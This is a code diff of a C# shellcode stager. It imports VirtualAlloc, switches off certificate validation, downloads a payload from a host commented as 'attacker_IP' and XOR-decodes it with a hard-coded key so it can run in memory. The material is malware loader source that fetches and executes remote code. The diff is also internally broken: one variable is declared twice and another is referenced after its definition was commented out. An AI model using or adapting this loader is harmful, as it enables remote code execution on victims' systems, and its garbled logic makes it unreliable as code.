@@ -4,7 +4,8 @@ using System.Text;
 using System.Runtime.InteropServices;
 using System.Security.Cryptography.X509Certificates;
 
-public class Program {
+public class Program
+{
   [DllImport("kernel32")]
   private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
 
@@ -19,7 +20,7 @@ public class Program {
 
   public static void Main()
   {
-    string url = "https://10.9.144.254/";
+    string url = "https://10.10.10.10/"; //attacker_IP
     Stager(url);
   }
 
@@ -30,12 +31,11 @@ public class Program {
     ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
     ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
 
-    //byte[] shellcode = wc.DownloadData(url);
-    string key = wc.DownloadString(url + "mykey").Trim();
-    byte[] keyBytes = Encoding.ASCII.GetBytes(key);
+    byte[] shellcode = wc.DownloadData(url);
+    byte[] keyBytes = Encoding.ASCII.GetBytes("YoloSpaceHacker");
 
-    string sbuf = wc.DownloadString(url + "shellcode");
-    var buf = System.Convert.FromBase64String(sbuf);
+    //string sbuf = wc.DownloadString(url + "shellcode");
+    //var buf = System.Convert.FromBase64String(sbuf);
 
     byte[] shellcode = xor(buf, keyBytes);
 
